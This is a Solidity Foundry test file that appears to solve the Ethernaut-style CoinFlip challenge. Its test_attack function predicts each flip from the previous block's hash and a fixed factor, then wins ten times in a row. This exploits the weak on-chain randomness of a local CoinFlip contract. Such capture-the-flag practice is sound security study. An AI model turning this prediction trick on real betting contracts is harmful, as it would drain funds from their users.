// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./CoinFlip.sol";

contract CoinFlipTest is Test {
    CoinFlip internal _flip;

    uint256 public constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function setUp() public {
//        vm.createSelectFork("sepolia", 4480085);
        vm.roll(10000);

        _flip = new CoinFlip();
    }

    function test_attack() public {
        uint256 blockNumber = block.number;

        for (uint256 i; i < 10; i++) {
            vm.roll(blockNumber + i);

            bool guess = uint256(blockhash(block.number - 1)) >= FACTOR;

            console.logBool(guess);

            _flip.flip(guess);
        }

        assertGe(_flip.consecutiveWins(), 10, "wins");
    }
}